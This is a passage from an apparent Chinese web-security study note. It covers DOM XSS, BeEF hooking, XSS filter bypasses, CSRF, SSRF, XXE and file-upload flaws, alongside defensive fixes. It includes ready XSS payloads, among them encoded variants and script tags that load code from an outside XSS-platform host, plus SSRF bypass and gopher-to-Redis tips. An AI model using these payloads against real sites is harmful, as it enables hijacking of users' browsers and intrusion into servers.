文档对象模型的一种漏洞。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。</p><p><strong>漏洞挖掘点</strong></p><p>​通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</p><p><strong>漏洞利用攻击流程</strong></p><ol><li>攻击者将Payload放置咋URL链接中(针对GET型反射XSS)</li><li>用户点击恶意链接，并打开浏览器</li><li>此时浏览器客户端并不会发起HTTP请求到WEB服务器，而是在浏览器客户端执行XSS代码</li><li>此时将XSS代码执行结果发送给攻击者的恶意服务器</li><li>攻击者访问自己的XSS平台并读取用户的敏感信息</li></ol><h3 id="XSS攻击类型区别"><a class="header-anchor" href="#XSS攻击类型区别">¶</a>XSS攻击类型区别</h3><table><thead><tr><th>XSS类型</th><th>存储型</th><th>反射型</th><th>Dom型</th></tr></thead><tbody><tr><td>触发过程</td><td>1.黑客构造XSS脚本2.正常用户访问携带XSS脚本的页面</td><td>正常用户访问携带XSS脚本的URL</td><td>正常用户访问携带XSS脚本的URL</td></tr><tr><td>数据存储</td><td>数据库</td><td>URL</td><td>URL</td></tr><tr><td>谁来输出</td><td>后端WEB应用程序</td><td>后端WEB应用程序</td><td>前端JavaScript</td></tr><tr><td>输出位置</td><td>HTTP响应中</td><td>HTTP响应中</td><td>动态构造的Dom节点</td></tr></tbody></table><h3 id="Beef攻击平台"><a class="header-anchor" href="#Beef攻击平台">¶</a><strong>Beef攻击平台</strong></h3><p>​极为流行的“BeEF”框架是世界上最流行的WEB框架攻击平台，全称为“<code>The Browser Exploitation Framework Project</code>”。它的原理是利用XSS漏洞，通过一段编写好的JavaScript（hook.js）控制目标主机的浏览器。“BeEF”本来的意思是牛肉，这个渗透框架一直在更新中，最新的版本中添加了很多高效的功能，另外一点极为优秀的地方就是这个渗透框架还可以与Metasploit完美地结合在一起。</p><p>项目地址：<a href="http://github.com/beefproject/beef.git">http://github.com/beefproject/beef.git</a></p><p>Web界面管理控制台：<a href="http://127.0.0.1:3000/ui/panel%E3%80%82%E7%94%A8%E4%BA%8E%E6%9F%A5%E7%9C%8B%E4%B8%8A%E9%92%A9%E7%9A%84%E9%B1%BC%E5%84%BF%E4%BB%A5%E5%8F%8A%E5%AF%B9%E4%B8%8D%E5%90%8C%E7%9A%84%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86%E6%93%8D%E4%BD%9C">http://127.0.0.1:3000/ui/panel。用于查看上钩的鱼儿以及对不同的目标进行管理操作</a><br>shellcode探针：<a href="http://127.0.0.1:3000/hook.js%EF%BC%8C%E5%8F%AA%E8%A6%81%E6%9C%89%E4%BA%BA%E8%BF%90%E8%A1%8C%E8%AF%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%9C%A8%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B8%8A%E7%BA%BF%EF%BC%88%E4%B8%8A%E9%92%A9%EF%BC%89%E3%80%82">http://127.0.0.1:3000/hook.js，只要有人运行该文件，就会在管理控制台上线（上钩）。</a></p><p><strong>安装Beef</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install beef-xss<br></code></pre></td></tr></table></figure><p>Kali已经把Beef-XSS做成服务了，使用systemctl命令来启动或关闭beef服务器.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start beef-xss.service  //开启<br>systemctl stop beef-xss.service  //关闭<br>systemctl restart beef-xss.service //重启<br></code></pre></td></tr></table></figure><p>可能需要开启apache服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">service apache2 start<br></code></pre></td></tr></table></figure><p><strong>Beef联动MSF</strong></p><p>待补充……</p><h3 id="XSS绕过"><a class="header-anchor" href="#XSS绕过">¶</a>XSS绕过</h3><ol><li><strong>过滤标签</strong></li></ol><blockquote><p>在程序里如果使用 html 实体过滤，在 php 会使用 htmlspecialchars()对输入的字符进行实体化，实体化之后的字符不会在 html 执行。把预定义的字符 “&lt;” （小于） 和 “&gt;” （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用&lt;或 者&gt;，这两个字符被实体化后在 html 里就不能执行了。</p><p>预定义字符：</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&amp; (和号)成为 <span class="hljs-symbol">&amp;amp;</span> <br>&quot; (双引号)成为 <span class="hljs-symbol">&amp;quot;</span><br>&#x27; (单引号)成为 <span class="hljs-symbol">&amp;#039;</span><br>&lt; (小于)成为 <span class="hljs-symbol">&amp;lt;</span><br>&gt;(大于)成为 <span class="hljs-symbol">&amp;gt;</span>  <br></code></pre></td></tr></table></figure><p>但是有在 input 这些标签里是不用考虑标签实体化，因为用不上&lt;&gt;这两个标签：<br><code>  &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; onclick=&quot;javascript:alert('xss');&quot;/&gt;</code></p><ol start="2"><li><strong>过滤Alert</strong></li></ol><p>用其他替换掉alert</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-regexp">/xss/</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>confirm(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.xss123.com/eciAKj?1623635663</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><strong>GPC过滤字符</strong></li></ol><p>如果 gpc 开启的时候，特殊字符会被加上斜杠即，'变成' ，xss 攻击代码不要带用单引号或双引号。<br>绕过 gpc 在 php 高版本 gpc 默认是没有的，但是开发程序员会使用 addcslashes() 对特殊字符进行转义。</p><p>这个是执行不了的</p><p><code>&lt;script src='http://www.xss123.com/JGdbsl?1623638390'&gt;&lt;/script&gt;</code></p><p>没有单引号可执行</p><p><code>&lt;script src=http://www.xss123.com/JGdbsl?1623638390&gt;&lt;/script&gt; </code></p><ol start="4"><li><p><strong>Ascii编码</strong></p><p><code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt; </code></p></li></ol><p>//fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</p><ol start="4"><li><strong>URL编码</strong></li></ol><p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;123&lt;/a&gt;</code></p><ol start="5"><li><strong>JS编码</strong></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">八进制编码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;\141\154\145\162\164\50\61\51&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>16 进制编码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>jsunicode 编码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">\u0061\u006c\u0065\u0072\<span class="hljs-title function_">u0074</span>(<span class="hljs-string">&#x27;xss&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="6"><li><strong>HTML编码</strong></li></ol><blockquote><p>在=后可以解析 html 编码</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">十进制<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span>&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;confirm(&#x27;7<span class="hljs-symbol">&amp;#39;</span>);&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>十六进制<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span></span><br><span class="hljs-tag">/&gt;</span><br></code></pre></td></tr></table></figure><ol start="7"><li><strong>Base64编码绕过</strong></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">使用伪协议 base64 解码执行 xss <br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>111<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="8"><li><p><strong>构造事件绕过</strong></p><p>如果不能依靠属性进行跨站，那么还可以利用事件处理函数。<br><code>&lt;input type = &quot;button&quot;  value = &quot;clickme&quot; οnclick=&quot;alert('click me')&quot; /&gt; </code><br>事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数;<br>最后还可以使用fuzz大法去做模糊测试，然后构造payload,更事半功倍！</p></li></ol><h3 id="问题-v4"><a class="header-anchor" href="#问题-v4">¶</a><strong>问题</strong></h3><ol><li>给你一个存在XSS漏洞的网站后台，你接下来的攻击思路是什么？说一下详细的流程步骤。</li><li>博彩网站存在反射型的XSS，在网站首页存在在线客服的窗口，问：你该如何进行利用？</li></ol><h1>CSRF客户端请求伪造</h1><blockquote><p>CSRF（英语：Cross-site request forgery）跨站请求伪造(客户端请求伪造)，也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS利用的是<strong>用户对指定网站的信任</strong>，CSRF利用的是<strong>网站对用户网页浏览器的信任</strong>。最大的区别就是CSRF没有盗取用户的cookie,而是直接的利用了浏览器存储的cookie让用户去执行某个动作。</p></blockquote><h2 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h2><p>​由于网站对用户网页浏览器的信任导致用户在当前已登录的Web站点的状态下，访问攻击者构造的攻击连接从而执行非本意的操作的漏洞</p><h2 id="危害（利用方式）"><a class="header-anchor" href="#危害（利用方式）">¶</a>危害（利用方式）</h2><ol><li>以受害者名义发送邮件，发消息。</li><li>盗取受害者的账号，甚至购买商品，虚拟货币转账。</li><li>修改受害者的网络配置（比如修改路由器DNS、重置路由器密码）。</li><li>网站后台创建管理员用户，破坏网站，获取服务器权限等。</li></ol><h2 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h2><p>1.用户处于登陆目标网站的状态(Cookie)<br>2.用户点击攻击者发送的恶意URL连接</p><h2 id="漏洞区别"><a class="header-anchor" href="#漏洞区别">¶</a>漏洞区别</h2><p>XSS跨站脚本：用户的浏览器   —》 用户<br>CSRF客户端请求伪造：目标网站下的用户   —》 用户</p><h2 id="防护"><a class="header-anchor" href="#防护">¶</a>防护</h2><p>1、验证请求头中的HTTP Referer字段<br>2、在请求包中添加Token并验证<br>3、在HTTP头中自定义属性并验证<br>4、高危操作加入验证码机制<br>5、使用HTTPonly进行防护</p><h1>SSRF服务端请求伪造</h1><h2 id="原理-v2"><a class="header-anchor" href="#原理-v2">¶</a>原理</h2><p>​由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据的Web安全漏洞！</p><h2 id="危害"><a class="header-anchor" href="#危害">¶</a>危害</h2><ul><li><p>可以对外网或服务器所在内网进行端口扫描，获取一些服务的Banner信息（端口对应服务）</p></li><li><p>对内网 WEB 应用进行指纹识别，通过访问默认文件实现（eg:Readme文件）</p></li><li><p>对主机本地敏感数据的读取（eg: file:///c:/win.ini/ or hosts）</p></li><li><p>内外网主机应用程序漏洞的利用(FTP/Redis/EMAIL)</p></li><li><p>内外网Web站点漏洞的利用（gopher://Ip or Domain/_GET/POST）</p></li></ul><h2 id="SSRF利用协议"><a class="header-anchor" href="#SSRF利用协议">¶</a>SSRF利用协议</h2><ul><li><p><strong>PHP</strong>：访问各个输入/输出流(I/O streams)，可BASE64编码形式读取PHP文件。</p></li><li><p><strong>file</strong>：在有回显的情况下，利用 file 协议可以读取任意文件的内容。</p></li><li><p><strong>dict</strong>：dict协议可以用来探测开放的端口其泄露安装软件版本信息/查看端口/操作内网redis服务等。</p></li><li><p><strong>http/s</strong>：访问 HTTP/S网址以此来探测内网主机存活。</p></li><li><p><strong>gopher</strong>：通过gopher访问对应计算机上的其他资源，支持发出GET/POST请求。是SSRF利用中一个最强大的协议(俗称万能协议)。可用于反弹shell!</p></li></ul><h2 id="高危函数"><a class="header-anchor" href="#高危函数">¶</a>高危函数</h2><p><strong>cur_exec()</strong>：执行给定的curl会话…这个函数应该在初始化一个curl会话并且全部的选向都被设置后调用…</p><p><strong>file_get_content()</strong>：函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法</p><p><strong>fsockopen()</strong>：打开一个网络连接或套接字连接</p><p>​1.使用fsockopen函数实现获取用户制定url的数据（文件或者html）。</p><p>​2.这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><p>​3.fsockopen本身就是打开一个网络连接或者Unix套接字连接。</p><h2 id="漏洞验证方式"><a class="header-anchor" href="#漏洞验证方式">¶</a>漏洞验证方式</h2><p>1、<strong>排除法</strong>：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p><p>2、<strong>dnslog等工具进行测试</strong>，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p><p>3、<strong>抓包分析发送的请求是不是通过服务器发送的</strong>，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p><ul><li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li><li>通过二级域名暴力猜解工具模糊猜测内网地址</li><li>通过file协议读取内网信息获取相关地址</li></ul><p>4、<strong>直接返回的Banner、title、content等信息</strong></p><p>5、留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p><h2 id="漏洞利用方式"><a class="header-anchor" href="#漏洞利用方式">¶</a>漏洞利用方式</h2><p>能扫描内部网络，获取端口，服务信息。</p><p>攻击运行在内网或本地的应用程序。</p><p>对内网web进行指纹识别。</p><p>对内部主机和端口发送请求包进行攻击。</p><p>file协议读取本地文件。</p><h2 id="SSRF漏洞挖掘点"><a class="header-anchor" href="#SSRF漏洞挖掘点">¶</a>SSRF漏洞挖掘点</h2><p>社交分享功能：获取超链接的标题等内容进行显示</p><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>在线翻译：给网址翻译对应网页的内容</p><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>邮件系统：比如接收邮件服务器地址</p><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h2 id="SSRF绕过"><a class="header-anchor" href="#SSRF绕过">¶</a>SSRF绕过</h2><p>待补充……</p><h2 id="漏洞防御"><a class="header-anchor" href="#漏洞防御">¶</a>漏洞防御</h2><ol><li>禁止跳转；</li><li>限制请求的端口为 http 常用的端口，比如 80、443、8080、8090；</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态；</li><li>设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）；</li><li>禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引 起的问题；</li><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的 文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准；</li></ol><h2 id="问题-v5"><a class="header-anchor" href="#问题-v5">¶</a>问题</h2><p><strong>1.XSS/CSRF/SSRF之间的区别？</strong></p><p><strong>2.造成SSRF漏洞的高危函数是？</strong></p><p>curl_exec()</p><p>file_get_contents</p><p>fsackopen</p><p><strong>3.SSRF打内网Redis思路及手法？</strong></p><p>通过 SSRF 的 gopher 协议操作内⽹的 redis</p><p><strong>4.SSRF绕过与防御手法？</strong></p><p>＠ 绕过</p><p>[::]或者localhost或者0.0.0.0　　绕过</p><p>添加端⼝号绕过</p><p>特殊域名ｄｎｓ解析</p><p>进制转换</p><p>句号</p><p>302短链接跳转</p><p><strong>如何判断是ssrf还是url跳转漏洞？</strong></p><p>dnslog判断ip是否是本机ip</p><h1>XML外部实体注入</h1><h2 id="原理-v3"><a class="header-anchor" href="#原理-v3">¶</a>原理</h2><p>​ XML外部实体注入（XML Extenrnal Entity Injection），简称XXE漏洞。引发XXE漏洞的主要原因是<strong>XML解析依赖库libxml默认开启了对外部实体的引用，导致服务端在解析用户提交的XML信息时未作处理直接进行解析，导致加载恶意的外部文件和代码，造成任意文件读取，命令执行、内网扫描等危害。</strong></p><h2 id="利用条件"><a class="header-anchor" href="#利用条件">¶</a><strong>利用条件</strong></h2><ul><li><strong>libxml&lt;2.9 默认开启</strong></li></ul><h2 id="基础知识-v2"><a class="header-anchor" href="#基础知识-v2">¶</a>基础知识</h2><p>XML文档结构包括<code>XML声明</code>，<code>DTD(文档类型定义)</code>,<code>文档元素</code>三部分构成！</p><p>XML是可扩展标记语言（Extensible Markup Language）,是设计用来进行数据的传输与存储。</p><p><strong>XML特性</strong></p><ul><li>XML 指可扩展标记语言（EXtensible Markup Language）</li><li>XML 是一种标记语言，很类似 HTML</li><li>XML 的设计宗旨是传输数据，而非显示数据</li><li>XML 标签没有被预定义。您需要自行定义标签</li><li>XML 被设计为具有自我描述性。</li><li>XML 是 W3C 的推荐标准</li><li>XML 是不作为的</li><li>XML 仅仅是纯文本</li><li>XML 可以发明自己的标签</li><li>XML 是对 HTML 的补充</li></ul><blockquote><p>DTD，即<code>Document Type Definition</code>，文档类型定义的简称，是一种精确描述XML语言的方式。DTD根据XML语言的语法规则检查XML文档结构的词汇和有效性。DTD主要用于保证XML文档格式正确，我们可以通过比较XML文档和DTD文件来看文档是否合乎规范，元素和标签使用是否正确。</p><p>备注：我们可以在XML文档中指定DTD，即<code>内部DTD</code>。也可以将DTD保存在单独的以.dtd扩展名的文档中，然后单独添加，这样即<code>外部DTD</code>。</p></blockquote><h3 id="内部DTD"><a class="header-anchor" href="#内部DTD">¶</a>内部DTD</h3><h3 id="外部DTD"><a class="header-anchor" href="#外部DTD">¶</a>外部DTD</h3><h3 id="实体"><a class="header-anchor" href="#实体">¶</a>实体</h3><p>实体是对数据的引用,通常使用<code>&lt;!ENTITY&gt;</code>标签定义；根据实体种类的不同，XML 解析器将使用实体的替代文本或者外部文档的内容来替代实体引用，它主要分为以下四类：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>》》》实体类型-按类型《《《</p><p>实体又分为通用实体和参数实体。</p><ol><li>通用实体</li></ol><ul><li>用 &amp;实体名;引用，在DTD 中定义（内外DTD都行），在 XML文档元素中引用。</li></ul><ol><li>参数实体</li></ol><ul><li>使用 % 实体名;(中间有空格) 在DTD中定义（内外DTD都行），并且只能在DTD中使用 %实体名; 引用。</li><li>在 DTD 文件中，参数实体的声明可以引用其他实体（参数实体和通用实体）。</li></ul><p>》》》实体类型-按位置《《《</p><p>根据实体位置定义位置的不同分为<code>内部实体</code>和<code>外部实体</code>，其中：</p><p>内部实体：在DTD中声明实体，则称为内部实体。</p><p>外部实体：如果在DTD之外声明实体，则称为外部实体。</p><h3 id="漏洞挖掘"><a class="header-anchor" href="#漏洞挖掘">¶</a>漏洞挖掘</h3><p><strong>手工挖掘</strong></p><ul><li>关注提交数据的类型。如果是XML格式的，就可以进行测试。</li><li>关注数据包的<strong>Content-Type</strong>值。如果是<strong>text/xml</strong>或者是<strong>application/xml</strong>，就可以关注该数据包。还可以尝试更改<code>Content-Type</code>值，例如原来的Content-type是json，发送的也是json格式的数据，我们将Content-Type类型改为XML，数据也改为XML后，尝试是否可以成功。</li></ul><h3 id="漏洞修复"><a class="header-anchor" href="#漏洞修复">¶</a>漏洞修复</h3><p><strong>方式一：使用开发语言提供的禁用外部实体的方法</strong></p><ul><li>PHP</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">libxml_disable_entity_loader(true);<br></code></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br></code></pre></td></tr></table></figure><ul><li>Python</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))<br></code></pre></td></tr></table></figure><p><strong>方式二：过滤用户输入</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">过滤用户提交的XML数据 ，关键词：<span class="hljs-meta">&lt;!DOCTYPE&gt;</span>、<span class="hljs-meta">&lt;!ENTITY&gt;</span>、SYSTEM、PUBLIC<br></code></pre></td></tr></table></figure><h3 id="实例"><a class="header-anchor" href="#实例">¶</a>实例</h3><p><strong>CVE-2017-12629 XXE 漏洞</strong></p><p>fofa：app=“APACHE-Solr”</p><p>待补充………………</p><h1>文件上传漏洞</h1><h2 id="原理-v4"><a class="header-anchor" href="#原理-v4">¶</a>原理</h2><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。如常见的头像上传，图片上传，oa 办公文件上传，媒体上传，允许用户上传文件，如果过滤不严格，恶意用户利用文件上传漏洞，上传有害的可以执行脚本文件到服务器中， 可以获取服务器的权限，或进一步危害服务器。</p><h2 id="危害-v2"><a class="header-anchor" href="#危害-v2">¶</a>危害</h2><p>非法用户可以上传的恶意文件控制整个网站，甚至是控制服务器，这个恶意脚本文件，又被称为 webshell， 上传 webshell 后门很方便地查看服务器信息，查看目录，执行系统命令等。</p><h2 id="文件上传代码"><a class="header-anchor" href="#文件上传代码">¶</a>文件上传代码</h2><p>文件上传时会返回一些代码 返回客户端 客户端根据这些值判断上传是否正常</p><ul><li><p>值：0; 没有错误发生，文件上传成功。</p></li><li><p>值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。</p></li><li><p>值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。</p></li><li><p>值：3; 文件只有部分被上传。</p></li><li><p>值：4; 没有文件被上传。</p></li></ul><h2 id="文件上传漏洞原因"><a class="header-anchor" href="#文件上传漏洞原因">¶</a>文件上传漏洞原因</h2><p>文件上传漏洞分为：</p><p><strong>直接文件上传(任意文件上传)</strong>，这种漏洞类型是属于高危漏洞的一种，能直接 getshell，而且没有任 何限制，攻击者很容易通过上传点，获取网站的控制权限；</p><p>另外一种是有条件的上传漏洞，这种漏洞一般 是开发者经验不足，对文件上传做了简单的限制，如简单的前端认证，文件头文件检测，这种检测行为， 可以完全绕过的；</p><p>另外一个方面就是权限认证没处理，没有对文件上传页面进行权限认证，匿名者就能访问上传文件，上传网页后门到网站目录，控制整个网站；</p><p>还有一些上传逻辑有问题，导致文件上传可以被绕过，上传后门到网站上。有的文件上传漏洞则是通过中间件或者系统特性上传可以被服务器解析脚本文件，从而导致网站可被控制；</p><h3 id="修复"><a class="header-anchor" href="#修复">¶</a>修复</h3><ul><li>在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问；</li><li>文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击 者放弃这个攻击途径；</li><li>设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传；</li><li>上传的后缀名，一定要设置成图片格式如 jpg png gif ；</li></ul><h3 id="攻击思路"><a class="header-anchor" href="#攻击思路">¶</a>攻击思路</h3><p>​寻找测试网站的文件上传的模块，常见：头像上传，修改上传，文件编辑器中文件上传，图片上传、媒体上传等，通过抓包上传恶意的文件进行测试，上传后缀名 asp php aspx 等的动态语言脚本，查看上传时的返回信息，判断是否能直接上传，如果不能直接上传，再进行测试上传突破，例如上传文件的时候只允许图片格式的后缀，但是修改文件时，却没有限制后缀名，图片文件可以修改成动态语言格式如 php，则可能访问这个文件的 URL 直接 getshell，可以控制网站。</p><h3 id="常见的网站文件后缀名"><a class="header-anchor" href="#常见的网站文件后缀名">¶</a>常见的网站文件后缀名</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 